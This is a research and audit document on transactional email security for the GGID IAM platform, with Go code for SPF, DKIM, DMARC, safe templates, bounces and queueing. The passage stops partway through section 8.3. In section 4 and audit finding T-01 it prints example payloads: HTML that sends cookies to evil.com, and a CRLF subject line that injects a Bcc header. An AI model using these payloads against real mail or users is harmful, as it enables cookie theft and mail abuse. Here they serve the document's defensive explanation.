# Email Security for IAM Transactional Emails

> Research document for the GGID IAM platform. Covers SPF, DKIM, DMARC,
> email template injection prevention, bounce handling, verification flow
> security, transactional email architecture, and an audit of the existing
> GGID `pkg/email` package and auth-service email flows.

---

## Table of Contents

1. [SPF (Sender Policy Framework)](#1-spf-sender-policy-framework)
2. [DKIM (DomainKeys Identified Mail)](#2-dkim-domainkeys-identified-mail)
3. [DMARC](#3-dmarc)
4. [Email Template Injection Prevention](#4-email-template-injection-prevention)
5. [Bounce and Complaint Handling](#5-bounce-and-complaint-handling)
6. [Email Verification Flow Security](#6-email-verification-flow-security)
7. [Transactional Email Architecture](#7-transactional-email-architecture)
8. [GGID Email Service Audit](#8-ggid-email-service-audit)
9. [Gap Analysis & Recommendations](#9-gap-analysis--recommendations)

---

## 1. SPF (Sender Policy Framework)

### What SPF Does

SPF (RFC 7208) is a DNS TXT record that specifies which IP addresses are
authorized to send email on behalf of a domain. When a receiving mail server
gets an inbound message, it checks the SPF record of the envelope-sender
domain (`MAIL FROM`). If the connecting IP is not listed, the receiver can
reject, quarantine, or mark the message as spam.

### Why IAM Needs SPF

GGID sends security-critical transactional emails:

- **Password reset links** — an attacker who spoofs `noreply@ggid.dev` can
  phish users with a fake reset page and harvest credentials.
- **Email verification links** — spoofed verification emails could trick
  users into confirming email ownership for an attacker-controlled account.
- **Magic link authentication** — if magic links land in spam or are
  spoofable, users lose trust in the passwordless flow.
- **MFA OTP codes** — a spoofed MFA code email could social-engineer users
  into disclosing the code.

Without SPF, recipient mail servers have no way to distinguish legitimate
GGID mail from spoofed mail claiming the same `From:` address.

### SPF Mechanisms

| Mechanism | Description |
|-----------|-------------|
| `a` | Authorize the domain's A record IPs |
| `mx` | Authorize the domain's MX record IPs |
| `ip4` | Authorize a specific IPv4 address or CIDR |
| `ip6` | Authorize a specific IPv6 address or CIDR |
| `include` | Include another domain's SPF record (e.g., `_spf.google.com`) |
| `exists` | Authorize if a constructed DNS name resolves |
| `all` | Catch-all — match any sender |

### SPF Qualifiers

Each mechanism can be prefixed with a qualifier:

| Qualifier | Meaning | Example |
|-----------|---------|---------|
| `+` | Pass (default if no qualifier) | `+ip4:1.2.3.4` |
| `-` | Fail — hard reject | `-all` |
| `~` | SoftFail — accept but mark | `~all` |
| `?` | Neutral — no policy assertion | `?all` |

### SPF Record Examples

**Minimal — single mail server:**
```
ggid.dev.  IN TXT  "v=spf1 ip4:203.0.113.10 -all"
```

**Using AWS SES:**
```
ggid.dev.  IN TXT  "v=spf1 include:amazonses.com -all"
```

**Using Google Workspace + SES:**
```
ggid.dev.  IN TXT  "v=spf1 include:_spf.google.com include:amazonses.com -all"
```

### DNS Lookup in Go

```go
package spf

import (
	"fmt"
	"net"
	"strings"
)

// LookupSPF retrieves the SPF TXT record for a domain.
// Returns the raw record or an error if none is found.
func LookupSPF(domain string) (string, error) {
	txts, err := net.LookupTXT(domain)
	if err != nil {
		return "", fmt.Errorf("DNS lookup failed for %s: %w", domain, err)
	}
	for _, txt := range txts {
		if strings.HasPrefix(txt, "v=spf1") {
			return txt, nil
		}
	}
	return "", fmt.Errorf("no SPF record found for %s", domain)
}

// CheckSPF verifies whether a sending IP is authorized by the domain's
// SPF record. This is a simplified check — production SPF evaluation
// should handle nested include chains with a 10-lookup limit.
func CheckSPF(domain, senderIP string) (bool, error) {
	record, err := LookupSPF(domain)
	if err != nil {
		return false, err
	}

	parts := strings.Fields(record)
	for _, part := range parts {
		if part == "v=spf1" {
			continue
		}

		// Check ip4 mechanisms
		if strings.HasPrefix(part, "ip4:") {
			allowedCIDR := strings.TrimPrefix(part, "ip4:")
			if ipInCIDR(senderIP, allowedCIDR) {
				return true, nil
			}
		}

		// Check a mechanism (domain's A records)
		if part == "a" || strings.HasPrefix(part, "a:") {
			domainToCheck := domain
			if strings.HasPrefix(part, "a:") {
				domainToCheck = strings.TrimPrefix(part, "a:")
			}
			if ipMatchesDomainA(senderIP, domainToCheck) {
				return true, nil
			}
		}

		// Check mx mechanism
		if part == "mx" {
			if ipMatchesMX(senderIP, domain) {
				return true, nil
			}
		}

		// -all or ~all means reject everything not matched above
		if part == "-all" || part == "~all" {
			return false, nil
		}
	}
	return false, nil
}

func ipInCIDR(ip, cidr string) bool {
	parsedIP := net.ParseIP(ip)
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		// Single IP, not CIDR
		return ip == cidr
	}
	return ipNet.Contains(parsedIP)
}

func ipMatchesDomainA(ip, domain string) bool {
	addrs, err := net.LookupIP(domain)
	if err != nil {
		return false
	}
	for _, addr := range addrs {
		if addr.String() == ip {
			return true
		}
	}
	return false
}

func ipMatchesMX(ip, domain string) bool {
	mxs, err := net.LookupMX(domain)
	if err != nil {
		return false
	}
	for _, mx := range mxs {
		if ipMatchesDomainA(ip, strings.TrimSuffix(mx.Host, ".")) {
			return true
		}
	}
	return false
}
```

---

## 2. DKIM (DomainKeys Identified Mail)

### What DKIM Does

DKIM (RFC 6376) adds a cryptographic signature to outgoing email. The
sending mail server signs selected headers and the body with a private key.
The public key is published in DNS under a selector record
(`selector._domainkey.example.com`). The receiving server retrieves the
public key from DNS, verifies the signature, and can confirm the email
was not modified in transit.

### Selector DNS Record

```
ggid._domainkey.ggid.dev.  IN TXT  "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC..."
```

- `v=DKIM1` — DKIM version
- `k=rsa` — key type
- `p=...` — base64-encoded public key

### Signing Headers and Body

DKIM signs:

- **Selected headers** — typically `From`, `To`, `Subject`, `Date`,
  `Message-ID`, `DKIM-Signature`
- **Body hash (bh)** — SHA-256 hash of the canonicalized email body

The `DKIM-Signature` header contains the algorithm (`a=rsa-sha256`),
canonicalization method (`c=relaxed/relaxed`), the selector (`s=ggid`),
the signing domain (`d=ggid.dev`), and the signature value.

### Key Rotation Strategy

Rotate DKIM keys every 6-12 months:

1. **Generate a new key pair** under a new selector (e.g., `ggid2025b`).
2. **Publish the new public key** in DNS alongside the old one.
3. **Wait for DNS TTL to expire** (24-48 hours).
4. **Start signing with the new key**.
5. **Keep the old key in DNS for at least 2 weeks** (for emails still in transit).
6. **Remove the old selector** from DNS.

### Why DKIM Matters for IAM Emails

Without DKIM, any mail server on the internet can spoof
`From: noreply@ggid.dev`. An attacker sending a fake password reset email
can:

- Steal user credentials via a phishing page linked in the email.
- Trick users into revealing MFA codes.
- Undermine trust in the GGID platform.

DKIM guarantees that the email was sent by a server holding the private key
and that the content was not tampered with in transit.

### Go Code for DKIM Signing

```go
package email

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"strings"
)

// DKIMSigner signs outgoing emails with DKIM.
type DKIMSigner struct {
	domain    string
	selector  string
	privateKey *rsa.PrivateKey
}

// NewDKIMSigner creates a DKIM signer.
func NewDKIMSigner(domain, selector string, privateKey *rsa.PrivateKey) *DKIMSigner {
	return &DKIMSigner{
		domain:     domain,
		selector:   selector,
		privateKey: privateKey,
	}
}

// Sign adds a DKIM-Signature header to the raw email.
func (s *DKIMSigner) Sign(rawEmail string) (string, error) {
	// Headers to sign — must include From.
	signedHeaders := []string{"from", "to", "subject", "date"}

	// Canonicalize headers (relaxed algorithm).
	canonicalHeaders := s.canonicalizeHeaders(rawEmail, signedHeaders)

	// Compute body hash.
	bodyHash := s.computeBodyHash(rawEmail)

	// Build the DKIM-Signature header (without the b= value).
	dkimHeader := s.buildDKIMHeader(signedHeaders, bodyHash)

	// Sign (canonicalized headers + dkim header).
	signingInput := canonicalHeaders + s.canonicalizeHeader("dkim-signature", dkimHeader)
	digest := sha256.Sum256([]byte(signingInput))
	signature, err := rsa.SignPKCS1v15(rand.Reader, s.privateKey, crypto.SHA256, digest[:])
	if err != nil {
		return "", fmt.Errorf("dkim sign failed: %w", err)
	}

	// Append the signature value.
	sigB64 := base64.StdEncoding.EncodeToString(signature)
	dkimHeader += "; b=" + sigB64

	// Prepend DKIM-Signature header to the email.
	return "DKIM-Signature: " + dkimHeader + "\r\n" + rawEmail, nil
}

func (s *DKIMSigner) buildDKIMHeader(headers []string, bodyHash string) string {
	var b strings.Builder
	b.WriteString("v=1")
	b.WriteString("; a=rsa-sha256")
	b.WriteString(fmt.Sprintf("; d=%s", s.domain))
	b.WriteString(fmt.Sprintf("; s=%s", s.selector))
	b.WriteString("; c=relaxed/relaxed")
	b.WriteString("; q=dns/txt")
	b.WriteString("; t=" + fmt.Sprintf("%d", 0)) // timestamp set at send time
	b.WriteString(fmt.Sprintf("; h=%s", strings.Join(headers, ":")))
	b.WriteString("; bh=" + bodyHash)

	return b.String()
}

func (s *DKIMSigner) canonicalizeHeaders(rawEmail string, headers []string) string {
	// Simplified: extract requested headers from rawEmail in order.
	// Production: implement RFC 6376 relaxed header canonicalization.
	headerEnd := strings.Index(rawEmail, "\r\n\r\n")
	if headerEnd < 0 {
		return ""
	}
	headerBlock := rawEmail[:headerEnd]
	var result strings.Builder
	for _, h := range headers {
		for _, line := range strings.Split(headerBlock, "\r\n") {
			if strings.HasPrefix(strings.ToLower(line), h+":") {
				result.WriteString(line)
				result.WriteString("\r\n")
			}
		}
	}
	return result.String()
}

func (s *DKIMSigner) computeBodyHash(rawEmail string) string {
	// Extract body (everything after the first blank line).
	parts := strings.SplitN(rawEmail, "\r\n\r\n", 2)
	body := ""
	if len(parts) > 1 {
		body = parts[1]
	}
	// Remove trailing whitespace per relaxed canonicalization.
	body = strings.TrimRight(body, " \t\r\n") + "\r\n"
	hash := sha256.Sum256([]byte(body))
	return base64.StdEncoding.EncodeToString(hash[:])
}

func (s *DKIMSigner) canonicalizeHeader(name, value string) string {
	// Relaxed canonicalization: lowercase name, collapse whitespace.
	name = strings.ToLower(strings.TrimSpace(name))
	value = strings.TrimSpace(value)
	return name + ":" + value + "\r\n"
}
```

> **Note**: For production, prefer a battle-tested library like
> `github.com/emersion/go-msgauth/dkim` rather than hand-rolling the
> canonicalization algorithms.

---

## 3. DMARC

### What DMARC Does

DMARC (RFC 7489) ties SPF and DKIM together with **alignment checking**.
Even if SPF and DKIM both pass individually, DMARC requires that the
domain in the `From:` header matches the domain authenticated by SPF
and/or DKIM. This prevents subdomain spoofing (e.g., `From: admin@mail.ggid.dev`
when only `ggid.dev` has SPF/DKIM).

### Policy Enforcement Levels

| Policy | Behavior on Authentication Failure |
|--------|-------------------------------------|
| `p=none` | Monitor only — deliver normally, send reports |
| `p=quarantine` | Send to spam/junk folder |
| `p=reject` | Reject the message at SMTP time |

### Aggregate and Forensic Reports

| Report Type | Purpose |
|-------------|---------|
| `rua` | Aggregate reports — XML, sent daily, summarizing all mail sources, volumes, and authentication results |
| `ruf` | Forensic reports — individual failing messages (PII concerns, use cautiously) |

### Gradual Rollout

```
# Phase 1: Monitor (2-4 weeks)
_dmarc.ggid.dev.  IN TXT  "v=DMARC1; p=none; rua=mailto:dmarc-reports@ggid.dev; ruf=mailto:dmarc-fail@ggid.dev; fo=1; adkim=s; aspf=s"

# Phase 2: Quarantine (2-4 weeks)
_dmarc.ggid.dev.  IN TXT  "v=DMARC1; p=quarantine; pct=50; rua=mailto:dmarc-reports@ggid.dev; fo=1; adkim=s; aspf=s"

# Phase 3: Full reject
_dmarc.ggid.dev.  IN TXT  "v=DMARC1; p=reject; rua=mailto:dmarc-reports@ggid.dev; fo=1; adkim=s; aspf=s"
```

- `pct` — percentage of mail the policy applies to (gradual rollout)
- `adkim=s` — strict DKIM alignment (exact domain match)
- `aspf=s` — strict SPF alignment
- `fo=1` — generate forensic reports on any authentication failure

### Go Code for DMARC Compliance Checking

```go
package dmarc

import (
	"fmt"
	"net"
	"strings"
)

// DMARCRecord holds parsed DMARC DNS record fields.
type DMARCRecord struct {
	Version  string
	Policy   string // none, quarantine, reject
	Pct      int
	RUA      string // aggregate report email
	RUF      string // forensic report email
	ADKIM    string // s (strict) or r (relaxed)
	ASPF     string // s (strict) or r (relaxed)
	Fo       string // failure reporting options
}

// LookupDMARC retrieves and parses the DMARC record for a domain.
func LookupDMARC(domain string) (*DMARCRecord, error) {
	dmarcDomain := "_dmarc." + domain
	txts, err := net.LookupTXT(dmarcDomain)
	if err != nil {
		return nil, fmt.Errorf("DMARC lookup failed for %s: %w", domain, err)
	}

	for _, txt := range txts {
		if strings.HasPrefix(strings.ToUpper(txt), "V=DMARC1") {
			return parseDMARC(txt), nil
		}
	}
	return nil, fmt.Errorf("no DMARC record found for %s", domain)
}

func parseDMARC(record string) *DMARCRecord {
	d := &DMARCRecord{Pct: 100}
	for _, tag := range strings.Split(record, ";") {
		tag = strings.TrimSpace(tag)
		parts := strings.SplitN(tag, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(parts[0]))
		val := strings.TrimSpace(parts[1])
		switch key {
		case "v":
			d.Version = val
		case "p":
			d.Policy = val
		case "pct":
			fmt.Sscanf(val, "%d", &d.Pct)
		case "rua":
			d.RUA = val
		case "ruf":
			d.RUF = val
		case "adkim":
			d.ADKIM = val
		case "aspf":
			d.ASPF = val
		case "fo":
			d.Fo = val
		}
	}
	return d
}

// CheckAlignment verifies SPF/DKIM alignment with the From header domain.
// SPFDomain is the envelope-sender domain (MAIL FROM).
// DKIMDomain is the d= tag from the DKIM-Signature.
// fromDomain is the domain in the From: header.
func CheckAlignment(fromDomain, spfDomain, dkimDomain, mode string) bool {
	// Strict alignment: exact match required
	if mode == "s" {
		if spfDomain != "" && spfDomain == fromDomain {
			return true
		}
		if dkimDomain != "" && dkimDomain == fromDomain {
			return true
		}
		return false
	}
	// Relaxed alignment: organizational domain match
	if mode == "r" {
		orgFrom := organizationalDomain(fromDomain)
		if spfDomain != "" && organizationalDomain(spfDomain) == orgFrom {
			return true
		}
		if dkimDomain != "" && organizationalDomain(dkimDomain) == orgFrom {
			return true
		}
		return false
	}
	return false
}

// organizationalDomain extracts the registrable domain from a subdomain.
// e.g., "mail.sub.ggid.dev" -> "ggid.dev"
func organizationalDomain(domain string) string {
	parts := strings.Split(domain, ".")
	if len(parts) <= 2 {
		return domain
	}
	return strings.Join(parts[len(parts)-2:], ".")
}
```

---

## 4. Email Template Injection Prevention

### Attack Vectors

Email template injection occurs when user-controlled data is inserted into
an email's headers or body without sanitization.

**HTML Injection in Body:**
An attacker sets their display name to `<script>alert(1)</script>` or
`<img src="http://evil.com/track?cookie=X">`. When this name is inserted
into an HTML email template, the payload executes in the email client
(HTML-enabled clients like Gmail can render it).

**Subject Header Injection via Newlines:**
If the subject is constructed from user input and the input contains
`\r\n` (CRLF), the attacker can inject additional headers:

```
Subject: Hello\r\nBcc: victim@example.com\r\n
```

This allows the attacker to add BCC recipients, inject additional
headers, or even split into a second email message.

### Output Encoding

| Context | Encoding Strategy |
|---------|-------------------|
| HTML body | HTML-escape `&`, `<`, `>`, `"`, `'` |
| Plain text body | Strip or escape HTML entities |
| Subject/From/To headers | Reject or strip `\r` and `\n` |
| URL in `href` | Validate URL scheme, encode query params |

### Go Code for Safe Email Template Rendering

```go
package email

import (
	"fmt"
	"html"
	"net/url"
	"strings"
)

// SafeMessageBuilder renders email content with injection-safe encoding.
type SafeMessageBuilder struct {
	maxNameLen  int
	maxSubjLen  int
}

func NewSafeMessageBuilder() *SafeMessageBuilder {
	return &SafeMessageBuilder{
		maxNameLen: 100,
		maxSubjLen: 200,
	}
}

// SanitizeForHeader strips CRLF sequences and limits length.
// This prevents header injection via newlines in user-controlled fields.
func SanitizeForHeader(input string) string {
	// Remove any CR or LF characters — they terminate a header line.
	input = strings.ReplaceAll(input, "\r", "")
	input = strings.ReplaceAll(input, "\n", "")
	// Limit length to prevent excessively long headers.
	if len(input) > 200 {
		input = input[:200]
	}
	return input
}

// SanitizeForHTML HTML-escapes user content for use in HTML email bodies.
func SanitizeForHTML(input string) string {
	// First HTML-escape the content.
	escaped := html.EscapeString(input)
	// Limit length.
	if len(escaped) > 500 {
		escaped = escaped[:500]
	}
	return escaped
}

// SanitizeURL validates a URL for use in email href attributes.
// Only allows http and https schemes.
func SanitizeURL(rawURL string) (string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return "", fmt.Errorf("unsupported URL scheme: %s", parsed.Scheme)
	}
	return parsed.String(), nil
}

// SafePasswordResetHTML renders the password reset email with all user
// inputs properly escaped.
func SafePasswordResetHTML(userName, resetLink, expiry, appName string) (string, error) {
	safeName := SanitizeForHTML(userName)
	safeLink, err := SanitizeURL(resetLink)
	if err != nil {
		return "", fmt.Errorf("reset link validation failed: %w", err)
	}
	safeExpiry := SanitizeForHTML(expiry)
	safeApp := SanitizeForHTML(appName)
	if safeApp == "" {
		safeApp = "GGID"
	}

	return fmt.Sprintf(`<html><body>
<h2>Password Reset Request</h2>
<p>Hi %s,</p>
<p>We received a request to reset your password. Click the button below:</p>
<a href="%s">Reset Password</a>
<p>This link will expire in %s.</p>
<p>If you didn't request this, you can safely ignore this email.</p>
<hr>
<p>This is an automated message from %s.</p>
</body></html>`, safeName, safeLink, safeExpiry, safeApp), nil
}

// SafePasswordResetSubject sanitizes the subject for header injection.
func SafePasswordResetSubject(appName string) string {
	safeApp := SanitizeForHeader(appName)
	if safeApp == "" {
		safeApp = "GGID"
	}
	return fmt.Sprintf("Reset Your %s Password", safeApp)
}
```

---

## 5. Bounce and Complaint Handling

### SMTP Bounce Codes

| Code | Type | Meaning | Action |
|------|------|---------|--------|
| 5.1.1 | Hard | User does not exist | Add to suppression list |
| 5.1.2 | Hard | Domain does not exist | Add to suppression list |
| 5.2.1 | Hard | Mailbox disabled | Add to suppression list |
| 5.2.2 | Hard | Mailbox full (permanent) | Retry once, then suppress |
| 4.2.2 | Soft | Mailbox full (temporary) | Retry after delay |
| 4.4.7 | Soft | Delivery time out | Retry with backoff |
| 4.7.1 | Soft | Rate limited / deferred | Retry with backoff |

**Hard bounce** — permanent failure, the address is invalid.
**Soft bounce** — temporary failure, retry with exponential backoff.

### Complaint Feedback Loops (FBL)

When a user marks an email as spam, the receiving ISP sends a complaint
notification via an FBL (Feedback Loop). Major providers (Gmail, Outlook,
Yahoo) support ARF (Abuse Reporting Format) messages. GGID must:

1. Subscribe to FBLs with major ISPs (or use the relay provider's built-in FBL).
2. Process ARF messages and add complainers to the suppression list.
3. Never send to a complaint address again (unless the user re-subscribes).

### Suppression List Management

The suppression list is a database/Redis set of email addresses that should
never receive email from GGID:

- Hard bounce addresses
- Complaint addresses
- User-unsubscribed addresses (for marketing — transactional may still be required)

**Why IAM Must Handle Bounces:**

- **Information leak**: If GGID keeps sending reset links to a dead address,
  and that address is later re-registered by an attacker (email recycling),
  the attacker may receive old reset links from mail server queues.
- **Reputation damage**: High bounce rates lower sender reputation,
  causing legitimate GGID emails to be rejected or marked as spam.
- **Compliance**: CAN-SPAM and GDPR require honoring opt-outs and not
  sending to invalid addresses.

### Go Code for Bounce Handler

```go
package bounce

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/redis/go-redis/v9"
)

// BounceType classifies the bounce severity.
type BounceType int

const (
	BounceUnknown BounceType = iota
	BounceHard    // permanent failure — suppress immediately
	BounceSoft    // temporary failure — retry with backoff
)

// BounceHandler processes bounce and complaint notifications.
type BounceHandler struct {
	rdb *redis.Client
}

func NewBounceHandler(rdb *redis.Client) *BounceHandler {
	return &BounceHandler{rdb: rdb}
}

// ClassifyBounce determines hard vs soft from an SMTP enhanced status code.
func ClassifyBounce(statusCode string) BounceType {
	code := strings.TrimSpace(statusCode)
	if strings.HasPrefix(code, "5") {
		return BounceHard
	}
	if strings.HasPrefix(code, "4") {
		return BounceSoft
	}
	return BounceUnknown
}

// AddToSuppressionList permanently suppresses an email address.
// Used for hard bounces and complaints.
func (h *BounceHandler) AddToSuppressionList(ctx context.Context, email, reason string) error {
	key := "ggid:suppress:" + strings.ToLower(email)
	return h.rdb.Set(ctx, key, reason, 0).Err() // TTL=0 means no expiry
}

// IsSuppressed checks if an email is on the suppression list.
func (h *BounceHandler) IsSuppressed(ctx context.Context, email string) (bool, error) {
	key := "ggid:suppress:" + strings.ToLower(email)
	val, err := h.rdb.Get(ctx, key).Result()
	if err == redis.Nil {
		return false, nil
	}
	if err != nil {
		return false, err
	}
	// Check if the suppression has expired for soft bounces.
	if strings.HasPrefix(val, "soft:") {
		suppressedAt, _ := time.Parse(time.RFC3339, strings.TrimPrefix(val, "soft:"))
		if time.Since(suppressedAt) > 72*time.Hour {
			// Allow retry after 72 hours.
			h.rdb.Del(ctx, key)
			return false, nil
		}
	}
	return true, nil
}

// HandleBounce processes a bounce notification from the email relay.
func (h *BounceHandler) HandleBounce(ctx context.Context, email, statusCode, diagnostic string) error {
	bounceType := ClassifyBounce(statusCode)

	switch bounceType {
	case BounceHard:
		reason := fmt.Sprintf("hard bounce: %s — %s", statusCode, diagnostic)
		if err := h.AddToSuppressionList(ctx, email, reason); err != nil {
			return fmt.Errorf("add to suppression: %w", err)
		}
		// Emit audit event for compliance trail.
		// audit.Publish(ctx, "email.bounce.hard", email, statusCode)

	case BounceSoft:
		reason := "soft:" + time.Now().UTC().Format(time.RFC3339)
		if err := h.AddToSuppressionList(ctx, email, reason); err != nil {
			return fmt.Errorf("add temporary suppression: %w", err)
		}

	case BounceUnknown:
		// Log but don't suppress — could be a transient infrastructure issue.
		// log.Printf("unknown bounce type for %s: %s", email, statusCode)
	}

	return nil
}

// HandleComplaint processes a spam complaint (FBL/ARF message).
func (h *BounceHandler) HandleComplaint(ctx context.Context, email string) error {
	reason := "complaint: user marked as spam"
	return h.AddToSuppressionList(ctx, email, reason)
}
```

---

## 6. Email Verification Flow Security

### Token Generation

Verification tokens must use a cryptographically secure random source
(`crypto/rand`), not `math/rand`. GGID already uses `crypto.GenerateRandomToken(32)`
in `pkg/crypto`, which produces 256 bits of entropy — sufficient.

### Token Expiry

| Flow | Recommended TTL | GGID Current |
|------|----------------|--------------|
| Password reset | 1 hour | 1 hour (Redis TTL) |
| Email verification | 24 hours | 24 hours (Redis TTL) |
| Email change | 24 hours | 24 hours (Redis TTL) |
| Magic link | 15 minutes | N/A (not implemented) |

### Single-Use Enforcement

Both `ConsumeResetToken` and `VerifyEmailToken` delete the Redis key after
successful validation. This ensures tokens cannot be replayed.

### Preventing Enumeration via Timing

GGID's `ForgotPassword` handler correctly returns `nil` (no error) when the
email is not found — it does not reveal whether the email exists. However,
the response timing could differ between the "found and token issued" path
and the "not found" path. To mitigate:

```go
// Always perform the same amount of work regardless of whether the
// credential exists. Issue a throwaway token even for non-existent users
// so the CPU time is identical.
func (s *AuthService) ForgotPasswordSafe(ctx context.Context, tenantID uuid.UUID, email string) error {
	cred, err := s.credentialRepo.FindByIDentifier(ctx, tenantID, email)
	if err != nil {
		// Log the real error but don't expose it.
		return nil
	}
	if cred == nil {
		// Burn CPU to match the real path timing.
		_, _ = s.passwordService.IssueResetToken(ctx, uuid.New(), tenantID)
		return nil
	}
	_, err = s.passwordService.IssueResetToken(ctx, cred.UserID, tenantID)
	return nil // always return nil
}
```

### Rate Limiting Verification Requests

Limit per-IP and per-email:

```go
// Rate limit verification email requests: max 3 per email per hour,
// max 10 per IP per hour.
func (s *AuthService) SendVerificationEmail(ctx context.Context, tenantID uuid.UUID, userID uuid.UUID, email string) (string, error) {
	// Per-email rate limit.
	emailKey := fmt.Sprintf("verifyemail:%s", email)
	count, _ := s.rateLimiter.rdb.Incr(ctx, emailKey).Result()
	if count == 1 {
		s.rateLimiter.rdb.Expire(ctx, emailKey, time.Hour)
	}
	if count > 3 {
		return "", fmt.Errorf("too many verification requests for this email")
	}

	token, err := s.emailService.IssueVerificationToken(ctx, tenantID, userID, email)
	if err != nil {
		return "", err
	}

	// In production, construct the verification URL and send via email queue.
	// verifyURL := fmt.Sprintf("https://app.ggid.dev/verify-email?token=%s", token)
	// s.emailQueue.Send(ctx, &email.Message{...})

	return token, nil
}
```

---

## 7. Transactional Email Architecture

### SMTP Relay vs Direct SMTP

| Approach | Pros | Cons |
|----------|------|------|
| **Direct SMTP** | No third-party dependency, full control | Must manage IP reputation, DKIM signing, bounce processing yourself |
| **SES/SendGrid/Postmark** | High deliverability, built-in DKIM, bounce/complaint webhooks, analytics | Vendor lock-in, per-email cost, data leaves your infrastructure |

**Recommendation for GGID**: Use a relay (AWS SES for cost, or Postmark for
deliverability). The relay handles SPF/DKIM setup, bounce/complaint
notifications via SNS/webhooks, and provides a reputation dashboard.

### Queue-Based Sending via NATS

Direct SMTP sends in the request path are fragile — SMTP timeouts cause HTTP
request latency, and there's no retry on failure. GGID should use NATS
JetStream for email queueing:

```go
package emailqueue

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/nats-io/nats.go"
	"github.com/nats-io/nats.go/jetstream"
)

// EmailQueue publishes emails to NATS JetStream for async processing.
type EmailQueue struct {
	js     jetstream.JetStream
	sender Sender
}

type QueuedEmail struct {
	ID        string    `json:"id"`
	Recipient string    `json:"recipient"`
	Subject   string    `json:"subject"`
	HTMLBody  string    `json:"html_body"`
	TextBody  string    `json:"text_body"`
	Attempt   int       `json:"attempt"`
	CreatedAt time.Time `json:"created_at"`
}

func NewEmailQueue(nc *nats.Conn, sender Sender) (*EmailQueue, error) {
	js, err := jetstream.New(nc)
	if err != nil {
		return nil, fmt.Errorf("create jetstream: %w", err)
	}

	// Create the email stream if it doesn't exist.
	ctx := context.Background()
	_, err = js.CreateOrUpdateStream(ctx, jetstream.StreamConfig{
		Name:      "EMAIL",
		Subjects:  []string{"email.send", "email.retry"},
		Retention: jetstream.WorkQueuePolicy,
		MaxAge:    24 * time.Hour,
	})
	if err != nil {
		return nil, fmt.Errorf("create email stream: %w", err)
	}

	return &EmailQueue{js: js, sender: sender}, nil
}

// Publish enqueues an email for async delivery.
func (q *EmailQueue) Publish(ctx context.Context, email *QueuedEmail) error {
	data, err := json.Marshal(email)
	if err != nil {
		return fmt.Errorf("marshal email: %w", err)
	}
	_, err = q.js.Publish(ctx, "email.send", data)
	return err
}

// Consume processes emails from the queue with retry.
func (q *EmailQueue) Consume(ctx context.Context) error {
	cons, err := q.js.CreateOrUpdateConsumer(ctx, "EMAIL", jetstream.ConsumerConfig{
		Name:    "email-worker",
		Durable: "email-worker",
	})
	if err != nil {
		return err
	}

	_, err = cons.Consume(func(msg jetstream.Msg) {
		var email QueuedEmail
		if err := json.Unmarshal(msg.Data(), &email); err != nil {
			msg.Nak() // poison message — will be redelivered
			return
		}

		err := q.sender.Send(ctx, &Message{
			To:       []string{email.Recipient},
			Subject:  email.Subject,
			HTMLBody: email.HTMLBody,
			TextBody: email.TextBody,
		})

		if err != nil {
			email.Attempt++
			// Exponential backoff: 1m, 5m, 15m, 60m
			if email.Attempt <= 4 {
				delay := time.Duration(1<<email.Attempt) * time.Minute
				data, _ := json.Marshal(email)
				q.js.Publish(ctx, "email.retry", data,
					jetstream.WithPublishDelay(delay))
			}
			// If max attempts exceeded, log and ack (drop).
			msg.Ack()
			return
		}
		msg.Ack()
	})

	return err
}
```

### DKIM Signing: Application Layer vs Relay

| Strategy | Where Signing Happens | Pros | Cons |
|----------|----------------------|------|------|
| **Relay signs** | SES/SendGrid signs outbound mail | Simple, relay manages keys and rotation | Must trust relay with private key |
| **Application signs** | GGID signs before handing to relay | Full key control, relay is just a transport | Must implement DKIM signing correctly |

**Recommendation**: Let the relay sign by default. Only sign at the
application layer if GGID needs to switch relays without DNS changes or if
compliance requires on-premise key custody.

---

## 8. GGID Email Service Audit

### 8.1 pkg/email/sender.go — SMTP Sender

**What exists:**
- `SMTPSender` struct with TLS (implicit + STARTTLS) support
- `NoopSender` and `LogSender` for dev/testing
- `Message` struct with From, To, Cc, Bcc, Subject, TextBody, HTMLBody,
  ReplyTo, Headers, Attachments
- `Config` struct with Host, Port, Username, Password, From, FromName,
  TLSMode, Timeout

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| E-01 | **No DKIM signing** — `SMTPSender.send()` builds raw message and sends without any cryptographic signature | High |
| E-02 | **No SPF/DMARC validation on inbound** (N/A — GGID is outbound only, but the verification flow should verify DMARC on the token-click domain) | Info |
| E-03 | **No message-ID header** — `buildHeaders()` does not set `Message-ID`, which some spam filters penalize | Medium |
| E-04 | **No multipart/alternative** — when both `HTMLBody` and `TextBody` are set, only HTML is sent; text-only clients see nothing | Low |
| E-05 | **TLS mode "none"** allows unencrypted SMTP — `TLSMode: "none"` falls through to `smtp.SendMail` without TLS verification | Medium |

### 8.2 pkg/email/templates.go — Email Templates

**What exists:**
- `PasswordResetHTML`, `PasswordResetText`
- `EmailVerificationHTML`
- `WelcomeHTML`
- `MFACodeHTML`

**Findings:**

| ID | Finding | Severity |
|----|---------|----------|
| T-01 | **HTML injection via string concatenation** — All templates use raw string concatenation (`d.UserName + ","`) without HTML escaping. An attacker who sets their name to `<script>...</script>` or `<img onerror=...>` gets it rendered in HTML emails | **Critical** |
| T-02 | **No URL validation** — `d.Link` is inserted directly into `href` attributes without validating the URL scheme. A `javascript:` or `data:` URI could be injected if the link is attacker-influenced | High |
| T-03 | **Missing EmailVerificationText** — only HTML variant exists, no plain text fallback | Low |
| T-04 | **Missing WelcomeText** — only HTML variant exists | Low |
| T-05 | **Missing MFACodeText** — only HTML variant exists | Low |

**Example of the injection vulnerability (T-01):**
```go
// Current code in PasswordResetHTML:
// "Hi " + d.UserName + ","
// If d.UserName = '<img src=x onerror="fetch(\'http://evil.com?\'+document.cookie)">'
// The payload renders in HTML email clients.
```

### 8.3 services/auth — Password Reset Flow

**What exists (`password_service.go`):**
- `IssueResetToken` generates a 32-byte `crypto/rand` token, hashes it,
